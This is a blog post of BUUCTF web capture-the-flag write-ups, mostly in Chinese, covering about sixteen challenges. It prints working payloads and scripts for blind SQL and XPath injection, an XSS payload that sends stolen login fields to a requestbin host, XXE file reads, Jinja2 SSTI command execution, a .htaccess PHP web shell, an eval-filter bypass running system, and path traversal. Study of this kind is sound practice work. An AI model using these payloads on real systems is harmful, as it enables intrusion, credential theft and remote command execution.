---
title: "BUUCTF Web Writeup 9"
date: 2022-12-21T16:35:12+08:00
lastmod: 2022-11-21T16:35:12+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录... (第5页上)

<!--more-->

## [CISCN2019 华东南赛区]Web4

任意文件读取

```
http://b49584d3-3080-416f-9e7e-f1390082ab6a.node4.buuoj.cn:81/read?url=/proc/self/cmdline
```

读取 cmdline 之后发现源文件在 /app/app.py 下, 然后读取 /usr/local/bin/python 发现环境是 2.7

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

一开始往 flask pin 方向想了, 看到 `uuid.getnode()` 才想起来读取的是 mac 地址, 那么就存在伪随机数的问题

```python
import random
import uuid

mac = '1a:fe:f0:5d:cc:05'
n = int(mac.replace(':', ''), 16)
random.seed(n)
print str(random.random() * 233)
```

首先必须得用 python 2.7 来跑, 然后坑点是 str 会对小数点后面几位四舍五入一下, 所以最终的 secret\_key 是 `145.348233579` 而不是 `145.34823357875226`

flask-session-cookie-manager 伪造 cookie 得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840944.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211251840586.png)

看 wp 学到一个知识点, flask 环境下可以用 `local_file://` 代替 `file://`

## [Black Watch 入群题]Web

前端 webpack 打包, 开发者工具可以看到 vue 源码

简单异或 sql 注入

```python
import requests
import time

flag = ''

i = 1

while True:

    min = 32
    max = 127

    while min < max:
        time.sleep(0.08)
        mid = (min + max) // 2
        print(chr(mid))

        payload = 'if(ascii(substr((select(group_concat(username,\'_\',password))from(admin)),{},1))>{},1,0)'.format(i, mid)
        url = 'http://8f46cc43-6237-42d6-ae95-bee39e010ed1.node4.buuoj.cn:81/backend/content_detail.php?id=1^({})^1'.format(payload)
        res = requests.get(url)
        if 'content' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1

    print('found', flag)
```

用跑出来的第二个用户登录即可得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211252017842.png)

## [GWCTF 2019]mypassword

注册一个用户登录, 然后看到 Feedback, 右键注释如下

```php
if(is_array($feedback)){
    echo "<script>alert('反馈不合法');</script>";
    return false;
}
$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
foreach ($blacklist as $val) {
    while(true){
        if(stripos($feedback,$val) !== false){
            $feedback = str_ireplace($val,"",$feedback);
        }else{
            break;
        }
    }
}
```

随便写一点内容, 提交后去 List 查看, 发现 response header

```
Content-Security-Policy: default-src 'self';script-src 'unsafe-inline' 'self'
```

猜测是 xss bypass CSP

上面的黑名单绕过逻辑有点问题, 这里可以通过添加某个关键词来绕过该关键词前面的内容

即往 input script src 这些单词里面插入 cookie 可以绕过, 但是 cookie 关键词本身绕不过去, 无法获取 `document.cookie` 的内容

之后发现登录界面引用了一个 js 文件

```javascript
if (document.cookie && document.cookie != '') {
	var cookies = document.cookie.split('; ');
	var cookie = {};
	for (var i = 0; i < cookies.length; i++) {
		var arr = cookies[i].split('=');
		var key = arr[0];
		cookie[key] = arr[1];
	}
	if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
		document.getElementsByName("username")[0].value = cookie['user'];
		document.getElementsByName("password")[0].value = cookie['psw'];
	}
}
```

到这里思路就很清晰了, 我们可以间接获取 cookie 的内容, 即先插入两个 input 表单并引用此 js 文件, 然后通过 dom 获取 username password, 最后绕过 csp 外带数据

绕过 csp 的方法很多, 下面以 `document.location` 为例

```html
<incookieput type="text" name="username">
<incookieput type="password" name="password">

<scrcookieipt scookierc="/js/login.js"></sccookieript>
<scrcookieipt>
	var username = docucookiement.getEcookielementsByName("username")[0].value;
    var password = doccookieument.getEcookielementsByName("password")[0].value;
    var  data = username + ":" + password;
    docookiecument.locacookietion = "http://http.requestbin.buuoj.cn/xxxx?data=" + data;
</scrcookieipt>
```

最后在 buu requestbin 上查看 flag

![image-20221130154432464](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301544573.png)

## [RootersCTF2019]babyWeb

简单报错注入

![image-20221130155328561](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301553622.png)

## [RoarCTF 2019]Simple Upload

thinkphp 3.2.4

```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
}
```

试了一圈后发现并没有限制上传白名单, 后来看了文档发现人家的参数是 exts, 所以根本就没有 allowExts 这个参数

[https://www.kancloud.cn/manual/thinkphp/1876](https://www.kancloud.cn/manual/thinkphp/1876)

继续看文档发现上传单文件是 uploadOne, 上传多文件是 upload, 那么这里就可以构造多个 file 表单上传, 只是返回不了文件地址 (代码中仅输出 `$info['file']['savepath']` 这一条路径)

思路就是同时上传 A B(PHP), 然后爆破得出 PHP 文件的路径, 或者是依次上传 A B(PHP) A 这种方式得到文件名的范围

thinkphp 3 默认用 uniqid 函数来生成文件名, 其实就是微秒级别的时间戳, 但是注意会出现 a b c d e f 这几个字母

最后按照上面的思路上传后爆破文件名得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211301726338.png)

## [HFCTF2020]BabyUpload

```php
<?php
error_reporting(0);
session_save_path("/var/babyctf/");
session_start();
require_once "/flag";
highlight_file(__FILE__);
if($_SESSION['username'] ==='admin')
{
    $filename='/var/babyctf/success.txt';
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION['username'] ='guest';
}
$direction = filter_input(INPUT_POST, 'direction');
$attr = filter_input(INPUT_POST, 'attr');
$dir_path = "/var/babyctf/".$attr;
if($attr==="private"){
    $dir_path .= "/".$_SESSION['username'];
}
if($direction === "upload"){
    try{
        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
            throw new RuntimeException('invalid upload');
        }
        $file_path = $dir_path."/".$_FILES['up_file']['name'];
        $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
            $upload_result = "uploaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $upload_result = $e->getMessage();
    }
} elseif ($direction === "download") {
    try{
        $filename = basename(filter_input(INPUT_POST, 'filename'));
        $file_path = $dir_path."/".$filename;
        if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
            throw new RuntimeException('invalid file path');
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException('file not exist');
        }
        header('Content-Type: application/force-download');
        header('Content-Length: '.filesize($file_path));
        header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
        if(readfile($file_path)){
            $download_result = "downloaded";
        }else{
            throw new RuntimeException('error while saving');
        }
    } catch (RuntimeException $e) {
        $download_result = $e->getMessage();
    }
    exit;
}
?>
```

上传目录跟 session 保存目录是在一起的, 一眼伪造 session

将 attr 置空可以将文件上传到 /var/babyctf 目录

然后注意 session id 不能包含 `_`, 所以需要上传的文件名为 `sess`, 这样后面取得该 session 的时候直接指定 PHPSESSID 为那串 sha256 即可

先发个包读一下 session 内容

![image-20221219180901408](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212191809575.png)

注意到是 php\_binary 的格式

然后构造上传包

![image-20221219180941303](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212191809382.png)

程序后面会检测 success.txt 是否存在

但其实只要仔细看手册就能发现它也能检测目录, 而目录名称对于我们来说是可控的

![image-20221219181017701](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212191810786.png)

于是构造最后一个上传包来创建 `success.txt` 目录

![image-20221219181008180](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212191810250.png)

带着 sha256 访问得到 flag

![image-20221219181325267](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212191813338.png)

## [GoogleCTF2019 Quals]Bnv

把 `Content-Type` 改成 `application/xml` 会发现有 xxe, 并且有错误回显

服务器不出网, 考虑利用本地 dtd 文件来进行 error-based xxe

参考文章如下

[https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/](https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/)

[https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

原理就是如果同一个实体被定义了两次, 那么在引用的时候只会引用第一次定义的实体

然后 xml 规范规定禁止在内部实体中使用参数实体, 需要通过引用外部 dtd 来绕过限制

```dtd
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ELEMENT message ANY>
    <!ENTITY % local SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;&#x27;>
        ">
        &#x25;eval;
    '>
    %local;
]>
<root>
<message>123</message>
</root>
```

![image-20221220194136808](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212201941884.png)

在第一篇文章中作者给出了另外一种无需引用外部 dtd 的构造方式

```dtd
<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ELEMENT message ANY>
    <!ENTITY % file SYSTEM "file:///flag">
    <!ENTITY % eval1 '
        <!ENTITY &#x25; eval2 "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;&#x25;file;&#x27;>
        ">
        &#x25;eval2;
    '>
    %eval1;
]>
<root>
<message>123</message>
</root>
```

似乎是解析器的问题 (?) 套了三层之后就检测不出来了

同样能够得到 flag

## [NPUCTF2020]ezlogin

登录页面 xpath 注入

比较烦的是每登录一次 token 就要更新

盲注出来的 xml 结构大致如下

```xml
<root>
    <accounts>
        <user>
            <id>1</id>
            <username>guest</username>
            <password>...</password>
        </user>
         <user>
            <id>2</id>
            <username>adm1n</username>
            <password>cf7414b5bdb2e65ee43083f4ddbc4d9f</password>
        </user>   
    </accounts>
</root>
```

python 脚本

```python
import requests
import time
import json
import re

# dicts = r'{}_,.-0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz'
# dicts = r'-0123456789abcdefgl{}'
dicts = '_0123456789abcdefghijklmnopqrstuvwxyz'

flag = ''

req = requests.Session()

for i in range(1, 99999):
    for s in dicts:
        time.sleep(0.2)
        print('testing', s)
        url = 'http://41b2f226-548a-4a99-b535-5c53aee7dbd3.node4.buuoj.cn:81/'
        res1 = req.get(url)
        token = re.findall('"token" value="(.*)"', res1.text)[0]
        # username = "' or count(/root/accounts/user[1]/*)=3 or '1"
        # username = "' or string-length(name(/root/accounts/user[1]/*[2]))=8 or '1"
        username = "' or substring((/root/accounts/user[2]/username), {}, 1)='{}' or '1".format(i, s)
        password = "123"
        xml = '''<username>{}</username><password>{}</password><token>{}</token>'''.format(username, password, token)
        res2 = req.post(url + 'login.php', data=xml, headers={
            'Content-Type': 'application/xml'
        })
        # print(res2.text)
        # exit()
        if '非法操作!' in res2.text:
            flag += s
            print(flag)
            break
```

md5 解密后为 `gtfly123`

登录后右键源码一串 base64, 解码后内容为 `flag is in /flag`

admin.php 页面存在任意文件读取 (非文件包含)

限制了 `.php` `php://filter` `base64` 关键字, 通过大小写绕过

另外对于读取后返回文件内容也存在检测, 用 base64 绕过

```
http://41b2f226-548a-4a99-b535-5c53aee7dbd3.node4.buuoj.cn:81/admin.php?file=PHP://filter/convert.BASE64-encode/resource=/flag
```

## [pasecactf_2019]flask_ssti

简单 ssti, 过滤了 `_` `.` `'`

构造 payload 如下

```python
{{config["\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f"]["\x5f\x5f\x69\x6e\x69\x74\x5f\x5f"]["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["os"]["popen"]("ls /")["read"]()}}
```

读取 /app/app.py

```python
import random
from flask import Flask, render_template_string, render_template, request
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = 'folow @osminogka.ann on instagram =)'

#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe
'''
def encode(line, key, key2):
return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
'''

def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

file = open("/app/flag", "r")
flag = file.read()
flag = flag[:42]

app.config['flag'] = encode(flag, 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
flag = ""

os.remove("/app/flag")

nicknames = ['˜”*°★☆★_%s_★☆★°°*', '%s ~♡ⓛⓞⓥⓔ♡~', '%s Вêчңø в øĤлâйĤé', '♪ ♪ ♪ %s ♪ ♪ ♪ ', '[♥♥♥%s♥♥♥]', '%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ', '♔%s♔', '[♂+♂=♥]%s[♂+♂=♥]']

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            p = request.values.get('nickname')
            id = random.randint(0, len(nicknames) - 1)
            if p != None:
                if '.' in p or '_' in p or '\'' in p:
                    return 'Your nickname contains restricted characters!'
                return render_template_string(nicknames[id] % p)
        except Exception as e:
            print(e)
        return 'Exception'

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

很经典的利用 /proc/self/fd/ 来读取 flag

注意需要使用 python open 函数来读取 (否则 self 指向的是某个命令的 pid)

```python
{{lipsum["\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"]["\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f"]["open"]("/proc/self/fd/3")["read"]()}}
```

![image-20221220215105187](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212202151267.png)

## [DDCTF 2019]homebrew event loop

```python
from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = '*********************'  # censored
url_prefix = '/d5afe1f66147e857'


def FLAG():
    return '*********************'  # censored


def trigger_event(event):
    session['log'].append(event)
    if len(session['log']) > 5:
        session['log'] = session['log'][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException:
    pass


def execute_event_loop():
    valid_event_chars = set(
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
    resp = None
    while len(request.event_queue) > 0:
        # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
        event = request.event_queue[0]
        request.event_queue = request.event_queue[1:]
        if not event.startswith(('action:', 'func:')):
            continue
        for c in event:
            if c not in valid_event_chars:
                break
        else:
            is_action = event[0] == 'a'
            action = get_mid_str(event, ':', ';')
            args = get_mid_str(event, action+';').split('#')
            try:
                event_handler = eval(
                    action + ('_handler' if is_action else '_function'))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None:
                    resp = ''
                resp += 'ERROR! All transactions have been cancelled. <br />'
                resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
                session['num_items'] = request.prev_session['num_items']
                session['points'] = request.prev_session['points']
                break
            except Exception, e:
                if resp is None:
                    resp = ''
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == '':
        resp = ('404 NOT FOUND', 404)
    session.modified = True
    return resp


@app.route(url_prefix+'/')
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
        querystring = 'action:index;False#False'
    if 'num_items' not in session:
        session['num_items'] = 0
        session['points'] = 3
        session['log'] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------


def view_handler(args):
    page = args[0]
    html = ''
    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(
        session['num_items'], session['points'])
    if page == 'index':
        html += '<a href="./?action:index;True%23False">View source code</a><br />'
        html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
        html += '<a href="./?action:view;reset">Reset</a><br />'
    elif page == 'shop':
        html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
    elif page == 'reset':
        del session['num_items']
        html += 'Session reset.<br />'
    html += '<a href="./?action:view;index">Go back to index.html</a><br />'
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == 'True':

        source = open('eventLoop.py', 'r')
        html = ''
        if bool_download_source != 'True':
            html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
            html += '<a href="./?action:view;index">Go back to index.html</a><br />'

        for line in source:
            if bool_download_source != 'True':
                html += line.replace('&', '&amp;').replace('\t', '&nbsp;'*4).replace(
                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br />')
            else:
                html += line
        source.close()

        if bool_download_source == 'True':
            headers = {}
            headers['Content-Type'] = 'text/plain'
            headers['Content-Disposition'] = 'attachment; filename=serve.py'
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event('action:view;index')


def buy_handler(args):
    num_items = int(args[0])
    if num_items <= 0:
        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
    session['num_items'] += num_items
    trigger_event(['func:consume_point;{}'.format(
        num_items), 'action:view;index'])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session['points'] < point_to_consume:
        raise RollBackException()
    session['points'] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return 'You naughty boy! ;) <br />'


def get_flag_handler(args):
    if session['num_items'] >= 5:
        # show_flag_function has been disabled, no worries
        trigger_event('func:show_flag;' + FLAG())
    trigger_event('action:view;index')


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')
```

这题卡挺久的, 一开始都在往怎么通过 eval 来执行 FLAG 函数这块去想了...

其实是一个逻辑漏洞, 核心是 `trigger_event` 会**记录 event 的日志**并保存至 `session['log']`

虽然 `show_flag_function` 无法返回 flag, 但在此之前 ` trigger_event('func:show_flag;' + FLAG())` 这句已经将 flag 的值保存到了 `session['log']`

所以只需要购买五个商品, 然后在返回包里面拿 session 再解密就能得到 flag

程序的逻辑漏洞在于 `buy_handler` 和 `consume_point_function` 是分开执行的, 而且有先后顺序

`buy_handler` 首先会将 `num_items` 加到 session 里面, 之后才会通过 `trigger_event` 调用 `consume_point_function` 扣钱, 扣钱失败就会 rollback

而在 `execute_event_loop` 函数中我们的 eval 语句可控 (注释绕过后缀限制), 也就意味着我们可以通过调用 `trigger_event` 来控制 `event_queue`, 从而控制相关函数的**执行顺序**

最终的思路就是调用 `trigger_event` 在 `consume_point_function` 执行之前先后放入 `buy_handler` 和 `get_flag_handler` 这两个 event 从而将 flag 写入 session, 这样即使最后 rollback 了也不会影响 `session['log']` 的值

payload 如下

```
/d5afe1f66147e857/?action:trigger_event#;action:buy;5#action:get_flag;1
```

![image-20221221131814976](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211318059.png)

![image-20221221131838328](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211318597.png)

## [XNUCA2019Qualifier]EasyPHP

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

非 index.php 不解析

利用 .htaccess 绕过

```
http://af195544-85f8-4e1f-8868-ef5faf8632eb.node4.buuoj.cn:81/?filename=.htaccess&content=php_value auto_prepend_fi\%0ale .htaccess%0a%23<?php system($_GET[1]);?>%0a%23%20\
```

![image-20221221144126952](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211441090.png)

## [PASECA2019]honey_shop

flask, 存在任意文件读取

py 被过滤不可读, 通过 /proc/self/environ 拿到 secret_key 然后伪造 balance

![image-20221221153041404](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211530480.png)

![image-20221221153052396](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211530503.png)

![image-20221221153058389](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212211530464.png)

## [WMCTF2020]Make PHP Great Again 2.0

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

```
http://b3578859-e62f-425c-9bb9-0e203951e865.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

## [NESTCTF 2019]Love Math 2

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 60) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

懒得写了, 这种题没啥意思...

```
http://7bd20883-8035-4fe3-9e2f-9acbb9f5e063.node4.buuoj.cn:81/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat /flag
```

## [GWCTF 2019]你的名字

简单 flask ssti

```
name={% print lipsum['__globals__']['__bui''ltins__']['__imp''ort__']('o''s')['pop''en']('cat /flag_1s_Hera')['re''ad']()  %}
```

## virink_2019_files_share

很怪, 访问 `/upload` 会卡住, 但 `/upload/` 就没问题

之后是一个任意文件读取, 过滤规则有点奇怪

```
/preview?f=....//....//....//....//....//....//....//....//f1ag_Is_h3reee//flag
```
